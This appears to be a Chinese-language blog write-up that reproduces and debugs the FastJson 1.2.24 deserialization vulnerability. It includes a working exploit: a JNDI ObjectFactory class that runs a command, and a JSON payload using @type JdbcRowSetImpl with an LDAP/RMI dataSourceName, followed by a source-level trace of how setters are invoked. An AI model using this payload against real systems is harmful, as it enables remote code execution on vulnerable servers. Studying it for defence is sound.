categories:
- cve复现
tags:
- java
- web
- 复现
title: FastJson1.2.24调试记录_复现
---
# FastJson1.2.23 反序列化复现
漏洞exp:
```java
public class Exploit implements ObjectFactory {
    public Object getObjectInstance(Object var1, Name var2, Context var3, Hashtable<?, ?> var4) {
        exec("xterm");
        return null;
    }

    public static String exec(String var0) {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException var2) {
            var2.printStackTrace();
        }

        return "";
    }

}
```

FastJsonTest.java
```java
public class App 
{
    public static void main( String[] args )
    {
        String payload="{\n" +
                "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "    \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"," +
                "    \"autoCommit\":true\n" +
                "}";

        JSON.parseObject(payload);
    }
}
```

## 调试
一步一步跟进去在
parseObject:320, DefaultJSONParser (com.alibaba.fastjson.parser)
发现了关于@type的处理

```
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());

    ...

    ObjectDeserializer deserializer = config.getDeserializer(clazz);
    return deserializer.deserialze(this, clazz, fieldName);
}
```
跟下去观察到是通过`Thread.currentThread().getContextClassLoader().loadClass(className);`
来加载@type的对应的值
跟进config.getDeserializer(clazz);
最后是通过`derializer = createJavaBeanDeserializer(clazz, type);`来生成反序列化处理器

```
public ObjectDeserializer createJavaBeanDeserializer(Class<?> clazz, Type type) {
        boolean asmEnable = this.asmEnable;//不是安卓设备则为true
        if (asmEnable) {
            JSONType jsonType = clazz.getAnnotation(JSONType.class);

            if (jsonType != null) {//检测是否存在JSONType注释
                ...
            }

            if (asmEnable) {
                Class<?> superClass = JavaBeanInfo.getBuilderClass(jsonType);//传入null
                if (superClass == null) {
                    superClass = clazz;
                }

                for (;;) {//检查clazz及其所有父类是否均为public
                    if (!Modifier.isPublic(superClass.getModifiers())) {
                        asmEnable = false;
                        break;
                    }

                    superClass = superClass.getSuperclass();
                    if (superClass == Object.class || superClass == null) {
                        break;
                    }
                }
            }
        }

        if (clazz.getTypeParameters().length != 0) {//没有使用泛型
            asmEnable = false;
        }

        if (asmEnable && asmFactory != null && asmFactory.classLoader.isExternalClass(clazz)) {
            asmEnable = false;
        }

        if (asmEnable) {//类名不存在.和不可见字符
            asmEnable = ASMUtils.checkName(clazz.getSimpleName());
        }

        if (asmEnable) {
            if (clazz.isInterface()) {
                asmEnable = false;
            }
            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);

            if (asmEnable && beanInfo.fields.length > 200) {
                asmEnable = false;
            }

            Constructor<?> defaultConstructor = beanInfo.defaultConstructor;
            if (asmEnable && defaultConstructor == null && !clazz.isInterface()) {
                asmEnable = false;
            }

            for (FieldInfo fieldInfo : beanInfo.fields) {
                ...
            }
        }

        if (asmEnable) {
            if (clazz.isMemberClass() && !Modifier.isStatic(clazz.getModifiers())) {
                asmEnable = false;
            }
        }

        if (!asmEnable) {
            return new JavaBeanDeserializer(this, clazz, type);
        }

        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
        try {
            return asmFactory.createJavaBeanDeserializer(this, beanInfo);
            // } catch (VerifyError e) {
            // e.printStackTrace();
            // return new JavaBeanDeserializer(this, clazz, type);
        } catch (NoSuchMethodException ex) {
            return new JavaBeanDeserializer(this, clazz, type);
        } catch (JSONException asmError) {
            return new JavaBeanDeserializer(this, beanInfo);
        } catch (Exception e) {
            throw new JSONException("create asm deserializer error, " + clazz.getName(), e);
        }
    }
```
阅读代码发现：
```
1. 不是安卓设备
2. clazz是否存在JSONType注释
3. clazz及其所有父类都是public
4. clazz类的声明没有使用泛型
5. clazz的类名不存在.
```
经过上述检查后进入`JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);`

```

    public static JavaBeanInfo build(Class<?> clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) {
        JSONType jsonType = clazz.getAnnotation(JSONType.class);

        Class<?> builderClass = getBuilderClass(jsonType);

        Field[] declaredFields = clazz.getDeclaredFields();//获取所有字段
        Method[] methods = clazz.getMethods();//获取所有public方法

        Constructor<?> defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);
        Constructor<?> creatorConstructor = null;
        Method buildMethod = null;

        List<FieldInfo> fieldList = new ArrayList<FieldInfo>();

        if (defaultConstructor == null && !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers()))) {
           ... 
        }

        if (defaultConstructor != null) {
            TypeUtils.setAccessible(defaultConstructor);
        }

        if (builderClass != null) {
            ...
        }

        for (Method method : methods) { //
            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
            String methodName = method.getName();
            if (methodName.length() < 4) {
                continue;
            }//方法名大于4

            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }//非静态方法

            // support builder set
            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
                continue;
            }//返回值是void 或 clazz类
            Class<?>[] types = method.getParameterTypes();
            if (types.length != 1) {
                continue;
            }//只有一个参数

            ...

            if (!methodName.startsWith("set")) { // TODO "set"的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
                continue;
            }//方法名以set开头

            char c3 = methodName.charAt(3);

            String propertyName;
            if (Character.isUpperCase(c3) //set后的第一个字符必须是大写或_或f
                || c3 > 512 // for unicode method name
            ) //获得set方法对应的字段
            {
                if (TypeUtils.compatibleWithJavaBean) {
                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
                } else {
                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
                }
            } else if (c3 == '_') {
                propertyName = methodName.substring(4);
            } else if (c3 == 'f') {
                propertyName = methodName.substring(3);
            } else if (methodName.length() >= 5 && Character.isUpperCase(methodName.charAt(4))) {
                propertyName = TypeUtils.decapitalize(methodName.substring(3));
            } else {
                continue;
            }

            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
            if (field == null && types[0] == boolean.class) {//字段不存在或是bool型
                String isFieldName = "is" + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
                field = TypeUtils.getField(clazz, isFieldName, declaredFields);
            }

            ...

            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
                                         annotation, fieldAnnotation, null));//添加到fieldList
        }

        for (Field field : clazz.getFields()) { // 添加非静态字段
            int modifiers = field.getModifiers();
            if ((modifiers & Modifier.STATIC) != 0) {//不允许STATIC
                continue;
            }
            
            if((modifiers & Modifier.FINAL) != 0) {
                Class<?> fieldType = field.getType();
                boolean supportReadOnly = Map.class.isAssignableFrom(fieldType) 
                        || Collection.class.isAssignableFrom(fieldType)
                        || AtomicLong.class.equals(fieldType) //
                        || AtomicInteger.class.equals(fieldType) //
                        || AtomicBoolean.class.equals(fieldType);
                if (!supportReadOnly) {
                    continue;
                }
            }

            boolean contains = false;
            for (FieldInfo item : fieldList) {
                if (item.name.equals(field.getName())) {
                    contains = true;
                    break; // 已经是 contains = true，无需继续遍历
                }
            }

            if (contains) {
                continue;
            }

            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
            String propertyName = field.getName();

            ...
            
            add(fieldList, new FieldInfo(propertyName, null, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, null,
                                         fieldAnnotation, null));
        }

        for (Method method : clazz.getMethods()) { // getter methods
            String methodName = method.getName();
            if (methodName.length() < 4) {
                continue;
            }

            if (Modifier.isStatic(method.getModifiers())) {
                continue;
            }

            if (methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3))) {
                if (method.getParameterTypes().length != 0) {
                    continue;
                }

                if (Collection.class.isAssignableFrom(method.getReturnType()) //
                    || Map.class.isAssignableFrom(method.getReturnType()) //
                    || AtomicBoolean.class == method.getReturnType() //
                    || AtomicInteger.class == method.getReturnType() //
                    || AtomicLong.class == method.getReturnType() //
                ) {
                    String propertyName;

                    ...
                    
                    FieldInfo fieldInfo = getField(fieldList, propertyName);
                    if (fieldInfo != null) {
                        continue;
                    }

                    if (propertyNamingStrategy != null) {
                        propertyName = propertyNamingStrategy.translate(propertyName);
                    }
                    
                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));
                }
            }
        }

        return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);
    }

```
大致总结一下会将哪些字段添加到FieldList中：
```
1. 存在public的set方法的字段（方法名的set后的第一个字符是大写或_）
2. 非Static和Final的字段（是的话要满足某些条件）
3. 返回值是满足某些条件的非静态get方法对应的字段
```
最后返回排序后的FieldList,生成deserializer
接着调用了`return deserializer.deserialze(this, clazz, fieldName);`
在程序执行错误(成功弹出计算器后的报错信息)的时候下断点进入`parseField`
`@type`字典下的其他字段,会进入
`boolean match = parseField(parser, key, object, type, fieldValues);`

```
    public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
                              Map<String, Object> fieldValues) {
        JSONLexer lexer = parser.lexer; // xxx

        FieldDeserializer fieldDeserializer = smartMatch(key);//如果fieldList没有这个字段则返回null

        final int mask = Feature.SupportNonPublicField.mask;
        ...

        lexer.nextTokenWithColon(fieldDeserializer.getFastMatchToken());

        fieldDeserializer.parseField(parser, object, objectType, fieldValues);

        return true;
    }
```
在fieldList字段查找存在后进入`fieldDeserializer.parseField(parser, object, objectType, fieldValues);`

```
    public void parseField(DefaultJSONParser parser, Object object, Type objectType, Map<String, Object> fieldValues) {
        ...
        Object value;
        if (fieldValueDeserilizer instanceof JavaBeanDeserializer) {
            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer) fieldValueDeserilizer;
            value = javaBeanDeser.deserialze(parser, fieldType, fieldInfo.name, fieldInfo.parserFeatures);
        } else {
            ...
            } else {
                value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);//获取值
            }
        }
        if (parser.getResolveStatus() == DefaultJSONParser.NeedToResolve) {
            ...
        } else {
            if (object == null) {
                fieldValues.put(fieldInfo.name, value);
            } else {
                setValue(object, value);//进入这里
            }
        }
    }
```
最后进入setValue
```
ublic void setValue(Object object, Object value) {
        if (value == null //
            && fieldInfo.fieldClass.isPrimitive()) {
            return;
        }

        try {
            Method method = fieldInfo.method;
            if (method != null) {
                if (fieldInfo.getOnly) {
                    ...
                } else {
                    method.invoke(object, value);
                }
                return;
            } else {
                ...
            }
        } catch (Exception e) {
            throw new JSONException("set property error, " + fieldInfo.name, e);
        }
    }
```
进入对应字段的set或者get方法

至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了
因为以下payload能成功

```java
import com.sun.rowset.JdbcRowSetImpl;

public class CLIENT {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/aa");//可控uri
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}
```
且符合
- [x] 方法名长度大于4且以set开头，且第四个字母要是大写
- [x] 非静态方法
- [x] 返回类型为void或当前类
- [x] 参数个数为1个
这些条件
RCE达成